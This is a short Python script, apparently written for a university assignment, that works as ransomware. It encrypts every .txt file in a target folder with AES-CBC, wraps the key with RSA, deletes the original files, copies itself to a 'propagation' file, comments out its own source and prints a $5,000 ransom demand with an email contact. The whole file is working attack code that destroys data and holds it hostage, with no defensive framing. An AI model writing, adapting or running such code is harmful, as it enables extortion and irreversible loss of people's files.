from base64 import b64encode, b64decode
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from base64 import b64decode
import glob
import os

# Generate AES_CBC instance
aesKey = get_random_bytes(32)
iv = b'0123456789abcdef'

# create public and private keys for RSA encryption of AES_CBC Key
key = RSA.generate(2048)
private_key = key.exportKey()
with open("ransomprvkey.pem", "wb") as f:
    f.write(private_key)

public_key = key.publickey().exportKey()

# encrypt AES_CBC Key
with open("key.bin", "wb") as f:
    cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))
    f.write(cipher_rsa.encrypt(aesKey))

# Read all files in directory
os.chdir(r'../Assignment1')
myFiles = glob.glob('*')

for files in myFiles:
    if files.endswith('.txt'):
        pre, ext = os.path.splitext(files)
        newFile = pre + ".enc"
        with open(files) as f:
            with open(newFile, "w") as f1:
                for line in f:
                    cipher = AES.new(aesKey, AES.MODE_CBC, iv)
                    padded_data = pad(line.encode(), AES.block_size)
                    cipherText_bytes = cipher.encrypt(padded_data)
                    li = b64encode(cipherText_bytes).decode('utf-8')
                    f1.write(li + '\n')
        os.remove(files)
    elif files.endswith('.py'):
        pre, ext = os.path.splitext(files)
        if pre == "ransomware":
            with open(files) as f:
                with open("ransomware_propagation.py",
                          "w") as f1:
                    for line in f:
                        f1.write(line)

src = 'ransomware.py'
dst = 'ransomware1.py'
os.rename(src, dst)

with open(dst) as f:
    with open(src, "w") as f1:
        for line in f:
            f1.write('#' + line)

os.remove(dst)

print("Your text files are encrypted. To decrypt them, you need to pay me $5,000 and send key.bin in your folder to "
      "mrb242@uowmail.edu.au")
